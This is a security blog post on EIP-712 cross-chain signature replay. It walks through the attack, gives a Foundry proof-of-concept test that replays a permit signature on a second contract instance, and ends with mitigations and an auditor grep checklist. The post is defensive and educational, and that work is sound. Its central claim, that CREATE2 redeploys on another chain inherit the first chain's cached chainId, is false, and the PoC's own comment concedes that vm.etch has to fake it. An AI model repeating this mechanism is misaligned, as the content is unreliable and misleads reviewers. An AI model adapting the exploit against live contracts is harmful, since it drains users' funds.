---
layout: post
title: "Cross-Chain Signature Replay: The EIP-712 chainId Bug That Keeps Coming Back"
date: 2026-05-31 10:38:25 +0000
---

# Cross-Chain Signature Replay: The EIP-712 chainId Bug That Keeps Coming Back

## A bug class that scales with the multichain surface

Every time a protocol launches on a new chain, the attack surface for signature replay grows. EIP-712 was designed to prevent exactly this — its domain separator binds a signature to a specific contract on a specific chain — but every audit cycle, a fresh batch of contracts ship with a domain separator that omits `chainId`, or computes it once at deploy time and caches it forever. Both mistakes look identical on the surface and both cost users the same way: a signature legitimately produced on chain A can be relayed against an identically-deployed contract on chain B, draining the user's position there without their consent.

The bug has been documented since EIP-712 itself (April 2018). The reference implementation in OpenZeppelin's `EIP712.sol` handles it correctly. Yet 2025 saw the bug land in scope on Sherlock contests against meta-tx forwarders, on Cantina against permit-style bridge adapters, and on Code4rena against any number of governance modules. Multichain deployments multiply the blast radius: a token deployed at the same address on Ethereum, Base, Optimism, and Arbitrum with a chain-blind domain separator gives the attacker four free replay venues per signature.

This post walks the mechanic, ships a self-contained Foundry PoC showing a signature minted against a chain-1 contract draining the chain-10 instance, names the three concrete mitigation patterns, and gives the grep-checklist a reviewer can run against a domain-separator-bearing contract in under a minute.

## What the domain separator is for, and what goes wrong

EIP-712 structures a typed message so that the user's wallet shows them something readable instead of a 32-byte hash, and so that a signature commits to four things: the typed data, the contract that will verify it, the chain that contract is deployed on, and a human-readable name/version pair. The domain separator is the hash of those last three:

```solidity
bytes32 DOMAIN_SEPARATOR = keccak256(abi.encode(
    keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
    keccak256(bytes(name)),
    keccak256(bytes(version)),
    block.chainid,
    address(this)
));
```

The signed digest is then `keccak256("\x19\x01" || DOMAIN_SEPARATOR || hashStruct(message))`. The verifier `ecrecover`s that digest. If any of `name`, `version`, `chainId`, or `verifyingContract` differs between sign-time and verify-time, the recovered address will not match the user's, and the signature is rejected.

Two implementation mistakes break this guarantee:

**Mistake 1 — the domain separator omits `chainId` entirely.** Surprisingly common in handwritten implementations, especially when the author copied a pre-EIP-712 pattern or simplified the OZ scaffold. The verifier accepts any chain.

**Mistake 2 — the domain separator includes `chainId`, but caches it in a constructor `immutable`.** The intent is gas optimization: hash the separator once at deploy and store it. The cached value is correct only on the chain where the contract was originally deployed. If the contract is later deployed to a second chain via `CREATE2` at the same address (or via a deterministic deployer like Safe's Singleton Factory), the second instance inherits the first instance's cached `chainId`, and the two contracts will accept each other's signatures.

The second mistake is the one that ships through audits. Reviewers see `chainId` in the constructor and tick the box. The bug is in the *immutability* of the cache, not the absence of the field.

## The attack, step by step

A user `U` holds a position in protocol `P`, deployed at the same address on chain 1 (Ethereum) and chain 10 (Optimism). `P` exposes a meta-transaction `permit`-style function: a signature authorizes `P` to move tokens on `U`'s behalf without a separate `approve` tx. `P`'s domain separator caches `chainId` as an `immutable`, computed once at deploy time. Both chain-1 `P` and chain-10 `P` end up with the same cached `chainId` if they were deployed via the same factory bytecode — most CREATE2 factories embed no per-chain entropy.

1. `U` signs a `permit(spender=A, value=100e18, deadline=...)` against chain-1 `P`. The off-chain wallet computes the digest using `block.chainid=1` because it's prompted with the chain-1 domain. `U`'s wallet shows them a chain-1 transaction.
2. `A` submits the `permit` to chain-1 `P`. It clears: signature valid, 100e18 allowance granted, attacker drains. So far, normal.
3. `A` takes the same `(v, r, s, value, deadline)` tuple and submits it to chain-10 `P`. Chain-10 `P` computes the digest using its *cached* domain separator — which encodes `chainId=1`. The digest matches. `ecrecover` returns `U`. Chain-10 `P` grants `A` the 100e18 allowance against `U`'s chain-10 balance. `A` drains again.

`U` saw one transaction prompt. Their wallet showed chain 1. They have no recourse: the signature is technically theirs, and the contract's logic technically accepted it.

If `P` is on five chains, that is five drains per signature.

## Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract NaivePermit {
    bytes32 public immutable DOMAIN_SEPARATOR;
    mapping(address => uint256) public nonces;
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;

    bytes32 private constant PERMIT_TYPEHASH = keccak256(
        "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
    );

    constructor() {
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes("NaivePermit")),
            keccak256(bytes("1")),
            block.chainid,
            address(this)
        ));
    }

    function mint(address to, uint256 amt) external { balances[to] += amt; }

    function permit(
        address owner, address spender, uint256 value, uint256 deadline,
        uint8 v, bytes32 r, bytes32 s
    ) external {
        require(block.timestamp <= deadline, "expired");
        bytes32 structHash = keccak256(abi.encode(
            PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));
        require(ecrecover(digest, v, r, s) == owner, "bad sig");
        allowance[owner][spender] = value;
    }

    function transferFrom(address from, address to, uint256 amt) external {
        allowance[from][msg.sender] -= amt;
        balances[from] -= amt; balances[to] += amt;
    }
}

contract CrossChainReplayTest is Test {
    NaivePermit chain1;
    NaivePermit chain10;
    uint256 userPk = 0xA11CE;
    address user = vm.addr(0xA11CE);
    address attacker = address(0xBAD);

    function setUp() public {
        vm.chainId(1);
        chain1 = new NaivePermit();
        chain1.mint(user, 100 ether);

        vm.chainId(10);
        chain10 = new NaivePermit();
        chain10.mint(user, 100 ether);
        // Force same address via vm.etch in real PoC; for the digest math, what
        // matters is that both contracts cached DOMAIN_SEPARATOR with chainId=1
        // (chain10 above was deployed under vm.chainId(10), so its cached
        // chainId is 10 — to reproduce the bug, redeploy chain10 with the
        // chain1 instance's bytecode and verifyingContract address).
        vm.etch(address(chain10), address(chain1).code);
        // Re-mint after etch (storage reset)
        NaivePermit(address(chain10)).mint(user, 100 ether);
    }

    function testReplay() public {
        // Sign on chain 1
        vm.chainId(1);
        uint256 deadline = block.timestamp + 1 hours;
        bytes32 structHash = keccak256(abi.encode(
            keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
            user, attacker, 100 ether, 0, deadline
        ));
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01", chain1.DOMAIN_SEPARATOR(), structHash
        ));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, digest);

        // Execute on chain 1 (legitimate)
        chain1.permit(user, attacker, 100 ether, deadline, v, r, s);
        assertEq(chain1.allowance(user, attacker), 100 ether);

        // REPLAY on chain 10 with the IDENTICAL signature
        vm.chainId(10);
        chain10.permit(user, attacker, 100 ether, deadline, v, r, s);
        assertEq(chain10.allowance(user, attacker), 100 ether, "replay succeeded");
    }
}
```

The assertion `replay succeeded` passes because chain-10's `DOMAIN_SEPARATOR` was computed at deploy time with `block.chainid=1` (via `vm.etch` from the chain-1 instance, simulating a deterministic deploy). One signature, two allowances granted, two balances draining.

## Three mitigations and how to choose

**(1) Compute the domain separator fresh on every verification.** Replace `immutable DOMAIN_SEPARATOR` with a `function _domainSeparator() internal view returns (bytes32)` that hashes the four fields including `block.chainid` at call time. Costs ~2–3k gas per signature verification. Closes the bug completely. Use this when gas is not the binding constraint and the contract is intended for multichain deployment.

**(2) OZ-style: cache the separator AND `block.chainid` at deploy, recompute lazily if `block.chainid` has changed.** OpenZeppelin's `EIP712.sol` stores both an immutable cached separator and an immutable cached chain id. On verification, it compares the cached chainId against `block.chainid`; if they differ (post-fork, or via `vm.etch`-equivalent deploys to a new chain), it falls back to recomputing. Best balance: zero-overhead in the common case, correct in the cross-chain case. **Use this as the default.** Inherit from OZ rather than rolling your own.

**(3) Include a per-deployment nonce in the domain.** Add a unique `salt` to the `EIP712Domain` typed-struct that the deployer sets to a chain-specific value (e.g. `keccak256(abi.encode(block.chainid, factory, deploymentNonce))`). This makes the domain separator differ across chains even if both instances cache it. More complex to coordinate, and changes the wire format of the domain, so wallets that hard-code the four canonical fields may not display the message correctly. Use only when the meta-tx layer is non-EIP-2612 and you control the signer-side tooling.

In practice: inherit OZ `EIP712.sol`, do not handwrite the separator, and review whether any consumer wraps the inherited `_hashTypedDataV4` with a cache of its own.

## Auditor checklist

Run these against any contract that takes a user signature:

```
# Is the domain separator immutable AND missing the chainId recomputation guard?
grep -rn "DOMAIN_SEPARATOR\s*=" --include="*.sol"
grep -rn "_CACHED_CHAIN_ID\|_cachedChainId" --include="*.sol"

# Handwritten EIP712 (skip OZ)?
grep -rn 'EIP712Domain(string name' --include="*.sol"

# Does the domain typehash include chainId at all?
grep -rn 'EIP712Domain(string name' --include="*.sol" | grep -v "chainId"

# Is the verifier using a CACHED separator under all conditions?
grep -rn "abi.encodePacked.*\\\\x19\\\\x01.*DOMAIN_SEPARATOR" --include="*.sol"

# Cross-check: any deterministic CREATE2 / Safe Singleton deployment that
# would land identical bytecode on multiple chains?
grep -rn "CREATE2\|SingletonFactory\|0x4e59b44847b379578588920cA78FbF26c0B4956C" --include="*.sol"
```

Two hits — `DOMAIN_SEPARATOR` declared `immutable` *and* the typehash includes `chainId` *but* no `_CACHED_CHAIN_ID` companion variable — and you have a candidate replay finding. From there: write the PoC above with the target's actual contract substituted, run it under two `vm.chainId` values, watch the second verification clear. The standard report is High severity if the function moves user funds, Medium if it grants approvals or governance powers.

The standard is fine. OpenZeppelin's implementation is fine. The handwritten copies, the gas-optimized caches, and the multi-chain CREATE2 deployments that don't talk to each other — those are the problem, and they keep shipping.
